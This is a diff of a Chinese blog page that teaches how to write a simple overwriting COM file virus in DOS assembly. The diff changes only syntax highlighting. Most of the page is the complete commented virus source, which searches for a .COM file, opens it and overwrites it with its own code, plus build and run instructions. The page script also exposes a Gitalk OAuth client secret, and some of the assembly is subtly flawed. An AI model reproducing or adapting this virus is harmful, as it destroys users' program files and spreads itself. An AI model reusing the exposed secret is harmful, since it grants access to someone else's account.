@@ -1,86 +1,86 @@
-<!DOCTYPE html> <html lang="en"> <head> <meta charset="UTF-8"> <title>知不知</title> <meta name="viewport" content="width=device-width, initial-scale=1"> <meta name="theme-color" content="#157878"> <meta name="baidu-site-verification" content="" /> <meta name="apple-itunes-app" content="app-id=1227288468, app-argument=https://luowei.github.io/list/docs/asm/2011-03-11-%E7%94%A8%E6%B1%87%E7%BC%96%E5%86%99%E4%B8%80%E4%B8%AA%E7%AE%80%E5%8D%95%E7%9A%84COM%E8%A6%86%E7%9B%96%E5%9E%8B%E7%9A%84Virus.html"> <link rel="stylesheet" href="https://luowei.github.io/list/assets/css/normalize.css"> <link href='https://fonts.googleapis.com/css?family=Open+Sans:400,700' rel='stylesheet' type='text/css'> <link rel="stylesheet" href="https://luowei.github.io/list/assets/css/cayman.css"> </head> <body> <section class="page-header"> <h1 class="project-name">知不知</h1> <h2 class="project-tagline"><a style="color:#ffffff;" href="http://luowei.github.io/list">知不知</a> 是一个代码爱好者的技术知识分享部落格。</h2> <a href="http://wodedata.com" target="_blank" class="btn">wodedata</a> <a href="https://luowei.github.io/list" class="btn">home</a> <a href="http://app.wodedata.com" target="_blank" class="btn">APP作品</a> </section> <section class="main-content"> <!-- 标题 --> <h2>ASM-用汇编写一个简单的COM覆盖型的Virus</h2> <!-- Google Ads --> <script async="" src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script> <p><ins class="adsbygoogle" style="display:block; text-align:center;" data-ad-layout="in-article" data-ad-format="fluid" data-ad-client="ca-pub-8760692904992206" data-ad-slot="2948937366"></ins> <script> (adsbygoogle = window.adsbygoogle || []).push({}); </script></p> <p>先写一个测试程序”HelloWorld”,取名test.asm, 如下：</p> <div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">;DTA数据传输区,存放文件的相关控制信息，它的作用是在磁盘文件与程序之间做一个桥梁，</span>
-<span class="c">;程序写文件时先写DTA，程序读文件时就直接从DTA中读取文件的信息。</span>
+<!DOCTYPE html> <html lang="en"> <head> <meta charset="UTF-8"> <title>知不知</title> <meta name="viewport" content="width=device-width, initial-scale=1"> <meta name="theme-color" content="#157878"> <meta name="baidu-site-verification" content="" /> <meta name="apple-itunes-app" content="app-id=1227288468, app-argument=https://luowei.github.io/list/docs/asm/2011-03-11-%E7%94%A8%E6%B1%87%E7%BC%96%E5%86%99%E4%B8%80%E4%B8%AA%E7%AE%80%E5%8D%95%E7%9A%84COM%E8%A6%86%E7%9B%96%E5%9E%8B%E7%9A%84Virus.html"> <link rel="stylesheet" href="https://luowei.github.io/list/assets/css/normalize.css"> <link href='https://fonts.googleapis.com/css?family=Open+Sans:400,700' rel='stylesheet' type='text/css'> <link rel="stylesheet" href="https://luowei.github.io/list/assets/css/cayman.css"> </head> <body> <section class="page-header"> <h1 class="project-name">知不知</h1> <h2 class="project-tagline"><a style="color:#ffffff;" href="http://luowei.github.io/list">知不知</a> 是一个代码爱好者的技术知识分享部落格。</h2> <a href="http://wodedata.com" target="_blank" class="btn">wodedata</a> <a href="https://luowei.github.io/list" class="btn">home</a> <a href="http://app.wodedata.com" target="_blank" class="btn">APP作品</a> </section> <section class="main-content"> <!-- 标题 --> <h2>ASM-用汇编写一个简单的COM覆盖型的Virus</h2> <!-- Google Ads --> <script async="" src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script> <p><ins class="adsbygoogle" style="display:block; text-align:center;" data-ad-layout="in-article" data-ad-format="fluid" data-ad-client="ca-pub-8760692904992206" data-ad-slot="2948937366"></ins> <script> (adsbygoogle = window.adsbygoogle || []).push({}); </script></p> <p>先写一个测试程序”HelloWorld”,取名test.asm, 如下：</p> <div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">;DTA数据传输区,存放文件的相关控制信息，它的作用是在磁盘文件与程序之间做一个桥梁，</span>
+<span class="c1">;程序写文件时先写DTA，程序读文件时就直接从DTA中读取文件的信息。</span>
 
-<span class="p">.</span><span class="n">model</span> <span class="n">tiny</span>
-<span class="p">.</span><span class="n">code</span>
-    <span class="n">org</span> <span class="mi">0100</span><span class="n">h</span>
+<span class="nf">.model</span> <span class="nv">tiny</span>
+<span class="nf">.code</span>
+    <span class="nf">org</span> <span class="mh">0100h</span>
     
-<span class="n">ok</span><span class="o">:</span> <span class="k">mov</span> <span class="n">dx</span><span class="p">,</span><span class="n">offset</span> <span class="n">message</span>
-    <span class="k">mov</span> <span class="n">ah</span><span class="p">,</span><span class="mi">09</span><span class="n">h</span>
-    <span class="k">int</span> <span class="mi">21</span><span class="n">h</span>
-    <span class="k">mov</span> <span class="n">ah</span><span class="p">,</span><span class="mi">4</span><span class="n">ch</span>
-    <span class="k">int</span> <span class="mi">21</span><span class="n">h</span>
-    <span class="k">ret</span>
-    <span class="n">message</span> <span class="kt">db</span> <span class="err">'</span><span class="n">HelloWorld</span><span class="err">!!'</span><span class="p">,</span><span class="mi">0</span><span class="n">dh</span><span class="p">,</span><span class="mi">0</span><span class="n">ah</span><span class="p">,</span><span class="sc">'$'</span>
-<span class="n">end</span> <span class="n">ok</span>
-</code></pre></div></div> <p>用: tasm test.asm 编译，再tlink test.obj /t 命令生成test.com文件。这个文件用于测试。<br /> 接着是Virus程序，这取名叫v.asm ,代码如下:</p> <div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">.</span><span class="n">model</span> <span class="n">tiny</span>
-<span class="p">.</span><span class="n">code</span>
-<span class="n">org</span> <span class="mi">100</span><span class="n">h</span>
-<span class="n">start</span><span class="o">:</span>
+<span class="nl">ok:</span> <span class="nf">mov</span> <span class="nb">dx</span><span class="p">,</span><span class="nv">offset</span> <span class="nv">message</span>
+    <span class="nf">mov</span> <span class="nb">ah</span><span class="p">,</span><span class="mh">09h</span>
+    <span class="nf">int</span> <span class="mh">21h</span>
+    <span class="nf">mov</span> <span class="nb">ah</span><span class="p">,</span><span class="mh">4ch</span>
+    <span class="nf">int</span> <span class="mh">21h</span>
+    <span class="nf">ret</span>
+    <span class="nf">message</span> <span class="nv">db</span> <span class="s">'HelloWorld!!'</span><span class="p">,</span><span class="mh">0dh</span><span class="p">,</span><span class="mh">0ah</span><span class="p">,</span><span class="s">'$'</span>
+<span class="nf">end</span> <span class="nv">ok</span>
+</code></pre></div></div> <p>用: tasm test.asm 编译，再tlink test.obj /t 命令生成test.com文件。这个文件用于测试。<br /> 接着是Virus程序，这取名叫v.asm ,代码如下:</p> <div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">.model</span> <span class="nv">tiny</span>
+<span class="nf">.code</span>
+<span class="nf">org</span> <span class="mh">100h</span>
+<span class="nl">start:</span>
 
-<span class="n">setdta</span><span class="o">:</span>            <span class="c">;设置DTA</span>
-    <span class="k">lea</span> <span class="n">dx</span><span class="p">,</span><span class="n">dta</span>    <span class="c">;将DTA的起始地址赋给dx</span>
-    <span class="k">mov</span> <span class="n">ah</span><span class="p">,</span><span class="mi">1</span><span class="n">ah</span>    <span class="c">;1ah功能调用，设置DTA地址，调用参数 ds:dx=DTA地址</span>
-    <span class="k">int</span> <span class="mi">21</span><span class="n">h</span>        <span class="c">;DOS中断</span>
+<span class="nl">setdta:</span>            <span class="c1">;设置DTA</span>
+    <span class="nf">lea</span> <span class="nb">dx</span><span class="p">,</span><span class="nv">dta</span>    <span class="c1">;将DTA的起始地址赋给dx</span>
+    <span class="nf">mov</span> <span class="nb">ah</span><span class="p">,</span><span class="mh">1ah</span>    <span class="c1">;1ah功能调用，设置DTA地址，调用参数 ds:dx=DTA地址</span>
+    <span class="nf">int</span> <span class="mh">21h</span>        <span class="c1">;DOS中断</span>
     
-<span class="n">findf</span><span class="o">:</span>            <span class="c">;查找文件</span>
-    <span class="k">mov</span> <span class="n">ah</span><span class="p">,</span><span class="mi">4</span><span class="n">eh</span>    <span class="c">;4eh功能调用，查找匹配文件，参数 ds:dx=ASCIZ串地址，cx属性</span>
-    <span class="k">lea</span> <span class="n">dx</span><span class="p">,</span><span class="n">fname</span>    <span class="c">;将文件名地址赋给dx</span>
-    <span class="k">mov</span> <span class="n">cx</span><span class="p">,</span><span class="mi">7</span>        <span class="c">;指定查找文件类型，7表示查找所有文件</span>
-    <span class="k">int</span> <span class="mi">21</span><span class="n">h</span>        <span class="c">;DOS中断</span>
-    <span class="k">jc</span> <span class="n">notfind</span>        <span class="c">;处理没有找到文件，jc是当CF=1时跳转</span>
+<span class="nl">findf:</span>            <span class="c1">;查找文件</span>
+    <span class="nf">mov</span> <span class="nb">ah</span><span class="p">,</span><span class="mh">4eh</span>    <span class="c1">;4eh功能调用，查找匹配文件，参数 ds:dx=ASCIZ串地址，cx属性</span>
+    <span class="nf">lea</span> <span class="nb">dx</span><span class="p">,</span><span class="nv">fname</span>    <span class="c1">;将文件名地址赋给dx</span>
+    <span class="nf">mov</span> <span class="nb">cx</span><span class="p">,</span><span class="mi">7</span>        <span class="c1">;指定查找文件类型，7表示查找所有文件</span>
+    <span class="nf">int</span> <span class="mh">21h</span>        <span class="c1">;DOS中断</span>
+    <span class="nf">jc</span> <span class="nv">notfind</span>        <span class="c1">;处理没有找到文件，jc是当CF=1时跳转</span>
     
-<span class="n">dispfn</span><span class="o">:</span>            <span class="c">;显示文件</span>
-    <span class="k">lea</span> <span class="n">dx</span><span class="p">,</span><span class="err">[</span><span class="n">dta</span><span class="o">+</span><span class="mi">30</span><span class="err">]</span>    <span class="c">;打印文件，位置在它偏移30个字节的地方</span>
-    <span class="k">push</span> <span class="n">ax</span>        <span class="c">;保存ax中的内容</span>
-    <span class="k">mov</span> <span class="n">ah</span><span class="p">,</span><span class="mi">09</span><span class="n">h</span>    <span class="c">;9号功能调用，显示字符串，调用参数 ds:dx=串地址，字符串以'$'结尾。</span>
-    <span class="k">pop</span> <span class="n">ax</span>        <span class="c">;还原ax</span>
+<span class="nl">dispfn:</span>            <span class="c1">;显示文件</span>
+    <span class="nf">lea</span> <span class="nb">dx</span><span class="p">,[</span><span class="nv">dta</span><span class="o">+</span><span class="mi">30</span><span class="p">]</span>    <span class="c1">;打印文件，位置在它偏移30个字节的地方</span>
+    <span class="nf">push</span> <span class="nb">ax</span>        <span class="c1">;保存ax中的内容</span>
+    <span class="nf">mov</span> <span class="nb">ah</span><span class="p">,</span><span class="mh">09h</span>    <span class="c1">;9号功能调用，显示字符串，调用参数 ds:dx=串地址，字符串以'$'结尾。</span>
+    <span class="nf">pop</span> <span class="nb">ax</span>        <span class="c1">;还原ax</span>
     
-<span class="n">openf</span><span class="o">:</span>            <span class="c">;打开文件</span>
-    <span class="k">mov</span> <span class="n">ax</span><span class="p">,</span><span class="mi">3</span><span class="n">d02h</span>    <span class="c">;3dh功能调用，调用参数 ds:dx=ASCIZ串地址，al=访问文件共享方式，0=读，1=写，2=读/写;若调用成功，返回参数AX=文件代号</span>
-    <span class="k">int</span> <span class="mi">21</span><span class="n">h</span>        <span class="c">;DOS中断</span>
-    <span class="k">jc</span> <span class="n">notopen</span>    <span class="c">;没有打开跳到notopen</span>
-    <span class="k">xchg</span> <span class="n">ax</span><span class="p">,</span><span class="n">bx</span>    <span class="c">;将打开文件功能调用的出口参数（文件代号）存到bx当中</span>
+<span class="nl">openf:</span>            <span class="c1">;打开文件</span>
+    <span class="nf">mov</span> <span class="nb">ax</span><span class="p">,</span><span class="mh">3d02h</span>    <span class="c1">;3dh功能调用，调用参数 ds:dx=ASCIZ串地址，al=访问文件共享方式，0=读，1=写，2=读/写;若调用成功，返回参数AX=文件代号</span>
+    <span class="nf">int</span> <span class="mh">21h</span>        <span class="c1">;DOS中断</span>
+    <span class="nf">jc</span> <span class="nv">notopen</span>    <span class="c1">;没有打开跳到notopen</span>
+    <span class="nf">xchg</span> <span class="nb">ax</span><span class="p">,</span><span class="nb">bx</span>    <span class="c1">;将打开文件功能调用的出口参数（文件代号）存到bx当中</span>
     
-<span class="n">pointf</span><span class="o">:</span>            <span class="c">;定义文件的读写指针</span>
-    <span class="k">mov</span> <span class="n">ax</span><span class="p">,</span><span class="mi">4200</span><span class="n">h</span>    <span class="c">;42号功能调用，移动文件指针，调用参数 BX=文件代号，CX:DX=位移量，AL=移动方式</span>
-    <span class="k">xor</span> <span class="n">cx</span><span class="p">,</span><span class="n">cx</span>        <span class="c">;将cx清零，代表偏移量的高位</span>
-    <span class="k">xor</span> <span class="n">dx</span><span class="p">,</span><span class="n">dx</span>        <span class="c">;将dx清零，代表偏移量的低位</span>
-    <span class="k">int</span> <span class="mi">21</span><span class="n">h</span>        <span class="c">;DOS中断，偏移量都为零，说明从文件的最开始处覆盖,若成功，dx:ax=新指针位置;失败，ax=错误码</span>
-    <span class="k">jc</span> <span class="n">notpoint</span>    <span class="c">;如果设置错误就跳转</span>
-    <span class="k">mov</span> <span class="n">filesize</span><span class="p">,</span><span class="n">ax</span>    <span class="c">;将文件的大小赋到内存单元中,ax是42号功能调用的出口参数</span>
+<span class="nl">pointf:</span>            <span class="c1">;定义文件的读写指针</span>
+    <span class="nf">mov</span> <span class="nb">ax</span><span class="p">,</span><span class="mh">4200h</span>    <span class="c1">;42号功能调用，移动文件指针，调用参数 BX=文件代号，CX:DX=位移量，AL=移动方式</span>
+    <span class="nf">xor</span> <span class="nb">cx</span><span class="p">,</span><span class="nb">cx</span>        <span class="c1">;将cx清零，代表偏移量的高位</span>
+    <span class="nf">xor</span> <span class="nb">dx</span><span class="p">,</span><span class="nb">dx</span>        <span class="c1">;将dx清零，代表偏移量的低位</span>
+    <span class="nf">int</span> <span class="mh">21h</span>        <span class="c1">;DOS中断，偏移量都为零，说明从文件的最开始处覆盖,若成功，dx:ax=新指针位置;失败，ax=错误码</span>
+    <span class="nf">jc</span> <span class="nv">notpoint</span>    <span class="c1">;如果设置错误就跳转</span>
+    <span class="nf">mov</span> <span class="nv">filesize</span><span class="p">,</span><span class="nb">ax</span>    <span class="c1">;将文件的大小赋到内存单元中,ax是42号功能调用的出口参数</span>
     
-<span class="n">writef</span><span class="o">:</span>            <span class="c">;写文件</span>
-    <span class="k">mov</span> <span class="n">ah</span><span class="p">,</span><span class="mi">40</span><span class="n">h</span>    <span class="c">;40h调用，写文件或设备，ds:dx=数据缓冲区地址，bx=文件代号，cx=写入的字节数;若调用成功返回ax=实际实际写入的字节数</span>
-    <span class="k">mov</span> <span class="n">cx</span><span class="p">,</span><span class="n">filel</span>    <span class="c">;把要写入文件的长度存到cx</span>
-    <span class="k">lea</span> <span class="n">dx</span><span class="p">,</span><span class="n">start</span>    <span class="c">;将病毒的起始地址存到dx当中</span>
-    <span class="k">int</span> <span class="mi">21</span><span class="n">h</span>        <span class="c">;DOS中断</span>
-    <span class="k">jc</span> <span class="n">notwrite</span>    <span class="c">;判断写入的状态</span>
+<span class="nl">writef:</span>            <span class="c1">;写文件</span>
+    <span class="nf">mov</span> <span class="nb">ah</span><span class="p">,</span><span class="mh">40h</span>    <span class="c1">;40h调用，写文件或设备，ds:dx=数据缓冲区地址，bx=文件代号，cx=写入的字节数;若调用成功返回ax=实际实际写入的字节数</span>
+    <span class="nf">mov</span> <span class="nb">cx</span><span class="p">,</span><span class="nv">filel</span>    <span class="c1">;把要写入文件的长度存到cx</span>
+    <span class="nf">lea</span> <span class="nb">dx</span><span class="p">,</span><span class="nv">start</span>    <span class="c1">;将病毒的起始地址存到dx当中</span>
+    <span class="nf">int</span> <span class="mh">21h</span>        <span class="c1">;DOS中断</span>
+    <span class="nf">jc</span> <span class="nv">notwrite</span>    <span class="c1">;判断写入的状态</span>
     
-<span class="n">closef</span><span class="o">:</span>            <span class="c">;执行了写操作之后关闭这个文件</span>
-    <span class="k">mov</span> <span class="n">ah</span><span class="p">,</span><span class="mi">3</span><span class="n">eh</span>    <span class="c">;3eh调用，关闭文件，bx=文件代号</span>
-    <span class="k">int</span> <span class="mi">21</span><span class="n">h</span>        <span class="c">;DOS中断</span>
-    <span class="k">jc</span> <span class="n">notclose</span>    <span class="c">;判断关闭文件是否成功</span>
+<span class="nl">closef:</span>            <span class="c1">;执行了写操作之后关闭这个文件</span>
+    <span class="nf">mov</span> <span class="nb">ah</span><span class="p">,</span><span class="mh">3eh</span>    <span class="c1">;3eh调用，关闭文件，bx=文件代号</span>
+    <span class="nf">int</span> <span class="mh">21h</span>        <span class="c1">;DOS中断</span>
+    <span class="nf">jc</span> <span class="nv">notclose</span>    <span class="c1">;判断关闭文件是否成功</span>
     
-<span class="n">findnext</span><span class="o">:</span>            <span class="c">;查找下一个文件</span>
-    <span class="k">mov</span> <span class="n">ah</span><span class="p">,</span><span class="mi">4</span><span class="n">fh</span>    <span class="c">;4fh调用，查找下一匹配文件，调用参数 DAT保留4eh的原始信息</span>
-    <span class="k">jmp</span> <span class="n">findf</span>        <span class="c">;跳回继续查找文件</span>
+<span class="nl">findnext:</span>            <span class="c1">;查找下一个文件</span>
+    <span class="nf">mov</span> <span class="nb">ah</span><span class="p">,</span><span class="mh">4fh</span>    <span class="c1">;4fh调用，查找下一匹配文件，调用参数 DAT保留4eh的原始信息</span>
+    <span class="nf">jmp</span> <span class="nv">findf</span>        <span class="c1">;跳回继续查找文件</span>
     
-<span class="n">notfind</span><span class="o">:</span>            <span class="c">;notfind符号地址</span>
-<span class="n">notopen</span><span class="o">:</span>            <span class="c">;notopen符号地址</span>
-<span class="n">notpoint</span><span class="o">:</span>
-<span class="n">notwrite</span><span class="o">:</span>
-<span class="n">notclose</span><span class="o">:</span>
+<span class="nl">notfind:</span>            <span class="c1">;notfind符号地址</span>
+<span class="nl">notopen:</span>            <span class="c1">;notopen符号地址</span>
+<span class="nl">notpoint:</span>
+<span class="nl">notwrite:</span>
+<span class="nl">notclose:</span>
 
-<span class="n">quit</span><span class="o">:</span>            <span class="c">;退出程序</span>
-    <span class="k">mov</span> <span class="n">ah</span><span class="p">,</span><span class="mi">4</span><span class="n">ch</span>    <span class="c">;4ch调用，带返回码终止，参数 al=返回码</span>
-    <span class="k">int</span> <span class="mi">21</span>
+<span class="nl">quit:</span>            <span class="c1">;退出程序</span>
+    <span class="nf">mov</span> <span class="nb">ah</span><span class="p">,</span><span class="mh">4ch</span>    <span class="c1">;4ch调用，带返回码终止，参数 al=返回码</span>
+    <span class="nf">int</span> <span class="mi">21</span>
     
-<span class="n">dta</span> <span class="kt">db</span> <span class="mi">44</span> <span class="n">dup</span> <span class="p">(</span><span class="mi">0</span><span class="p">)</span>        <span class="c">;定义一个44字节的缓冲区</span>
-    <span class="kt">db</span> <span class="sc">'$'</span>        <span class="c">;字符串的结束符，9号功能调用要用到</span>
+<span class="kd">dt</span><span class="nv">a</span> <span class="nv">db</span> <span class="mi">44</span> <span class="nv">dup</span> <span class="p">(</span><span class="mi">0</span><span class="p">)</span>        <span class="c1">;定义一个44字节的缓冲区</span>
+    <span class="kd">db</span> <span class="s">'$'</span>        <span class="c1">;字符串的结束符，9号功能调用要用到</span>
     
-<span class="n">fname</span> <span class="kt">db</span> <span class="s">"test.com"</span><span class="p">,</span><span class="mi">0</span>    <span class="c">;指定文件名</span>
-<span class="n">filesize</span> <span class="n">dw</span> <span class="o">?</span>        <span class="c">;定义一个存放文件大小的字节单元</span>
-<span class="n">filel</span> <span class="k">equ</span> <span class="err">$</span><span class="o">-</span><span class="n">start</span>        <span class="c">;当前的偏移量($(已经到了文件的末尾了))-病毒的起始偏移量(start)</span>
-<span class="n">end</span> <span class="n">start</span>
+<span class="nf">fname</span> <span class="nv">db</span> <span class="s">"test.com"</span><span class="p">,</span><span class="mi">0</span>    <span class="c1">;指定文件名</span>
+<span class="nf">filesize</span> <span class="nv">dw</span> <span class="nv">?</span>        <span class="c1">;定义一个存放文件大小的字节单元</span>
+<span class="no">filel</span><span class="kd"> equ</span> <span class="kc">$</span><span class="o">-</span><span class="nv">start</span>        <span class="c1">;当前的偏移量($(已经到了文件的末尾了))-病毒的起始偏移量(start)</span>
+<span class="nf">end</span> <span class="nv">start</span>
 </code></pre></div></div> <p>同样用: tasm v.asm 编译，再tlink v.obj 命令生成v.exe文件。运行v.exe文件,即可把v.exe绑到test.com文件上去 ！</p> <p>引自瑟凡老师的<a href="http://www.boobooke.com/m/s211.html">瑟凡计算机病毒系列</a><br /> 参考：<a href="http://www.boobooke.com/m2/">Win32Asm与RadAsm开发教程</a></p> <p><span class="site-footer-credits">版权所有，转载请注明出处 <a href="https://luowei.github.io/list">luowei.github.io</a>.</span></p> <link rel="stylesheet" href="/list/assets/css/font-awesome.min.css?ver=20151122" /> <!--[if IE 7 ]><link rel="stylesheet" href="/list/assets/css/font-awesome-ie7.min.css?ver=20151122"><![endif]--> <div style="float: right"> <span id="share"> <a class="wechat" target="_blank" title="分享到微信" href="https://chart.apis.google.com/chart?cht=qr&amp;chs=300x300&amp;chl=https%3A%2F%2Fluowei.github.io%2Flist%2Fdocs%2Fasm%2F2011-03-11-%25E7%2594%25A8%25E6%25B1%2587%25E7%25BC%2596%25E5%2586%2599%25E4%25B8%2580%25E4%25B8%25AA%25E7%25AE%2580%25E5%258D%2595%25E7%259A%2584COM%25E8%25A6%2586%25E7%259B%2596%25E5%259E%258B%25E7%259A%2584Virus.html"><i class="icon-large icon-wechat"></i></a> <a class="weibo" target="_blank" title="分享到微博" href="http://service.weibo.com/share/share.php?title=ASM-用汇编写一个简单的COM覆盖型的Virus - 知不知&amp;url=https%3A%2F%2Fluowei.github.io%2Flist%2Fdocs%2Fasm%2F2011-03-11-%25E7%2594%25A8%25E6%25B1%2587%25E7%25BC%2596%25E5%2586%2599%25E4%25B8%2580%25E4%25B8%25AA%25E7%25AE%2580%25E5%258D%2595%25E7%259A%2584COM%25E8%25A6%2586%25E7%259B%2596%25E5%259E%258B%25E7%259A%2584Virus.html&amp;type=3&amp;searchPic=1"><i class="icon-large icon-weibo"></i></a> <a class="qzone" target="_blank" title="分享到 QQ 空间" href="http://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=https%3A%2F%2Fluowei.github.io%2Flist%2Fdocs%2Fasm%2F2011-03-11-%25E7%2594%25A8%25E6%25B1%2587%25E7%25BC%2596%25E5%2586%2599%25E4%25B8%2580%25E4%25B8%25AA%25E7%25AE%2580%25E5%258D%2595%25E7%259A%2584COM%25E8%25A6%2586%25E7%259B%2596%25E5%259E%258B%25E7%259A%2584Virus.html&amp;title=ASM-用汇编写一个简单的COM覆盖型的Virus - 知不知&amp;summary=用汇编写一个简单的COM覆盖型的Virus&amp;site=/list"><i class="icon-large icon-qzone"></i></a> <a class="twitter" target="_blank" title="Share to Twitter" href="https://twitter.com/intent/tweet?url=https%3A%2F%2Fluowei.github.io%2Flist%2Fdocs%2Fasm%2F2011-03-11-%25E7%2594%25A8%25E6%25B1%2587%25E7%25BC%2596%25E5%2586%2599%25E4%25B8%2580%25E4%25B8%25AA%25E7%25AE%2580%25E5%258D%2595%25E7%259A%2584COM%25E8%25A6%2586%25E7%259B%2596%25E5%259E%258B%25E7%259A%2584Virus.html&amp;text=ASM-用汇编写一个简单的COM覆盖型的Virus - 知不知&amp;via=luowei010101"><i class="icon-large icon-twitter"></i></a> <a class="facebook" target="_blank" title="Share to Facebook" href="https://www.facebook.com/sharer.php?u=https%3A%2F%2Fluowei.github.io%2Flist%2Fdocs%2Fasm%2F2011-03-11-%25E7%2594%25A8%25E6%25B1%2587%25E7%25BC%2596%25E5%2586%2599%25E4%25B8%2580%25E4%25B8%25AA%25E7%25AE%2580%25E5%258D%2595%25E7%259A%2584COM%25E8%25A6%2586%25E7%259B%2596%25E5%259E%258B%25E7%259A%2584Virus.html&amp;t=ASM-用汇编写一个简单的COM覆盖型的Virus - 知不知"><i class="icon-large icon-facebook-sign"></i></a> <a class="googleplus" target="_blank" title="Share to Google+" href="https://plus.google.com/share?url=https%3A%2F%2Fluowei.github.io%2Flist%2Fdocs%2Fasm%2F2011-03-11-%25E7%2594%25A8%25E6%25B1%2587%25E7%25BC%2596%25E5%2586%2599%25E4%25B8%2580%25E4%25B8%25AA%25E7%25AE%2580%25E5%258D%2595%25E7%259A%2584COM%25E8%25A6%2586%25E7%259B%2596%25E5%259E%258B%25E7%259A%2584Virus.html"><i class="icon-large icon-google-plus-sign"></i></a> </span> </div> <hr /> <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.css" /> <script src="https://cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js"></script> <div id="gitalk-container"></div> <script type="text/javascript"> var gitalk = new Gitalk({ clientID: '9d5ee666269c252cf949', clientSecret: '728cd598f1fca9d8c1df1dfa300057883a3a8676', repo: 'list', owner: 'luowei', admin: ['luowei'], id: decodeURI('ASM-用汇编写一个简单的COM覆盖型的Virus'), distractionFreeMode: false }); gitalk.render('gitalk-container'); </script> <script type="text/javascript">var cnzz_protocol = (("https:" == document.location.protocol) ? "https://" : "http://");document.write(unescape("%3Cspan id='cnzz_stat_icon_1277627361'%3E%3C/span%3E%3Cscript src='" + cnzz_protocol + "s96.cnzz.com/z_stat.php%3Fid%3D1277627361%26show%3Dpic1' type='text/javascript'%3E%3C/script%3E"));</script> <footer class="site-footer"> <span class="site-footer-owner"><a href="https://luowei.github.io/list">知不知</a> is maintained by <a href="http://luowei.github.io/list">luowei</a>.</span> <span class="site-footer-credits">Developed by <a href="https://luowei.github.io/list">luowei</a>.</span> </footer> </section> </body> </html>
